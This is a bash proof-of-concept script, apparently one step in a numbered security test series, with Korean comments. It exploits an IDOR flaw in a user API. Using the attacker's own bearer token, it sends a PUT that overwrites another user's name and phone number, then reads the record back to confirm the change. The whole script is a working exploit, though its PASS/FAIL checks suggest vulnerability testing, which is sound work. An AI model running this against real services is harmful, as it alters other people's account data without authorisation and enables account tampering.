#!/usr/bin/env bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/env.sh"

[[ -f "$TOKEN_FILE" ]] || { echo "FAIL: $TOKEN_FILE 없음. 먼저 02_login.sh 실행"; exit 1; }
TOKEN=$(cat "$TOKEN_FILE")

echo "[05] IDOR — PUT $API_URL/users/$VICTIM_USER_ID 타인 변조"
echo "    JWT sub != path userId 검증 부재 → 타인 정보 임의 변경 가능"
echo

RESP=$(curl -sS -X PUT "$API_URL/users/$VICTIM_USER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"name":"hacked","phone":"010-9999-9999"}' \
  -w '\n%{http_code}')

BODY=$(echo "$RESP" | sed '$d')
CODE=$(echo "$RESP" | tail -n 1)

echo "  status: $CODE"
echo "  body: $BODY"
[[ "$CODE" == "200" ]] || { echo "FAIL"; exit 1; }

echo
echo "──── 변조 후 재조회 ────"
curl -sS "$API_URL/users/$VICTIM_USER_ID" -H "Authorization: Bearer $TOKEN" | jq .

echo "PASS — name='hacked', phone='010-9999-9999' 으로 바뀌어있어야 함"
